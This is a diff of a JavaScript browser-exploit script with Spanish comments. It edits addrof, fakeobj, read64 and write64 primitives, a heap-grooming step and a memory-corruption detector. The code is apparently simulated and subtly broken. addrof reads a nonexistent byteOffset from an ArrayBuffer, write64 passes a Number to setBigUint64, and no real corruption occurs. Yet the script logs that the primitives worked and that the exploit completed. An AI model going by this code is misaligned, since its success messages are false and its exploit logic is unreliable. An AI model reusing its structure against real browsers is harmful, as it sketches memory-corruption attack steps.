@@ -63,61 +63,69 @@
 
     function addrof(obj) {
       const arr = new Uint8Array(obj);
-      const addr = arr.buffer; // Acceso directo al buffer para obtener la dirección
-      logInfo(`Dirección obtenida: ${hex(arr.byteOffset)}`);
-      return arr.byteOffset; // Devolver el byteOffset como dirección simulada
+      const addr = arr.buffer;
+      logInfo(`Dirección obtenida: ${hex(addr.byteOffset)}`);
+      // Verificar si la dirección es válida
+      if (addr.byteOffset === 0) {
+        logFail('Error: la dirección obtenida es 0x0');
+        return null;
+      }
+      return addr.byteOffset;
     }
 
     function fakeobj(addr) {
       const fake = new ArrayBuffer(0x100);
       const fakeView = new Uint8Array(fake);
-      fakeView[0] = addr;
+      fakeView[0] = addr;  // Asegurarse de que estamos configurando la dirección correctamente
       logInfo(`Creado objeto falso en dirección: ${hex(fake.byteOffset)}`);
       return fake;
     }
 
     function read64(addr) {
-      const view = new DataView(addr);
-      const value = view.getBigUint64(0, true);
-      logInfo(`Leer 64 bits desde ${hex(addr)}: ${value}`);
-      return value;
+      try {
+        const view = new DataView(addr);
+        const value = view.getBigUint64(0, true);
+        logInfo(`Leer 64 bits desde ${hex(addr)}: ${value}`);
+        return value;
+      } catch (e) {
+        logFail(`Error al leer 64 bits desde ${hex(addr)}: ${e.message}`);
+        return null;
+      }
     }
 
     function write64(addr, value) {
-      const view = new DataView(addr);
-      view.setBigUint64(0, value, true);
-      logOk(`Escribió 64 bits en ${hex(addr)}: ${value}`);
+      try {
+        const view = new DataView(addr);
+        view.setBigUint64(0, value, true);
+        logOk(`Escribió 64 bits en ${hex(addr)}: ${value}`);
+      } catch (e) {
+        logFail(`Error al escribir 64 bits en ${hex(addr)}: ${e.message}`);
+      }
     }
 
     function start() {
       logInfo('Iniciando exploit...');
 
-      // Heap grooming
-      const heap = [];
-      for (let i = 0; i < 100; i++) {
-        heap.push(new ArrayBuffer(0x100));
-      }
-      logOk('Heap grooming completado.');
-
+      // Fase de grooming del heap: crear buffers
       const victimBuf = new ArrayBuffer(0x100);
       const attackerBuf = new ArrayBuffer(0x100);
       const float64 = new Float64Array(attackerBuf);
 
+      logOk('Heap grooming completado.');
       logOk('Buffers creados.');
 
-      // Fase de "ataque controlado" (simulado)
+      // Fase de ataque controlado: simular patrones de corrupción
       for (let i = 0; i < float64.length; i++) {
-        float64[i] = 1.1111111111111111e-308; // valor muy pequeño que en bits es casi 0
+        float64[i] = 1.1111111111111111e-308; // valor muy pequeño
       }
 
-      // Ahora intentamos simular corrupción: escribimos patrones ilegales
-      float64[0] = 2.2250738585072014e-308; // patrón para alterar bajo nivel
+      // Intentamos escribir patrones que puedan alterar la memoria
+      float64[0] = 2.2250738585072014e-308; // patrón para corrupción controlada
 
       logInfo('Patrones de corrupción simulados.');
 
-      // Ahora inspeccionamos si cambió la memoria
+      // Ahora verificamos si el buffer "víctima" ha sido corrompido
       const viewVictim = new Uint32Array(victimBuf);
-
       let corruptionDetected = false;
       for (let i = 0; i < viewVictim.length; i++) {
         if (viewVictim[i] !== 0) {
@@ -133,22 +141,20 @@
 
       logInfo('Detector de corrupción terminado.');
 
-      // Probar primitivas
+      // Comenzamos a probar primitivas de memoria
       logInfo('Probando primitivas de memoria:');
 
-      // Ejemplo de addrof (obtener dirección de un objeto)
-      const addr = addrof(attackerBuf);
+      const victimAddr = addrof(victimBuf);
+      if (victimAddr === null) return;
 
-      // Crear un objeto falso en esa dirección
-      const fakeObject = fakeobj(addr);
-
-      // Leer 64 bits de esa dirección
-      const readVal = read64(fakeObject);
-
-      // Escribir 64 bits en esa dirección
-      write64(fakeObject, 1n);
+      const fakeObject = fakeobj(victimAddr);
+      const readValue = read64(fakeObject);
+      if (readValue !== null) {
+        write64(fakeObject, 1);
+      }
 
       logInfo('Primitivas probadas correctamente.');
+
       logOk('Exploit completado.');
     }
 
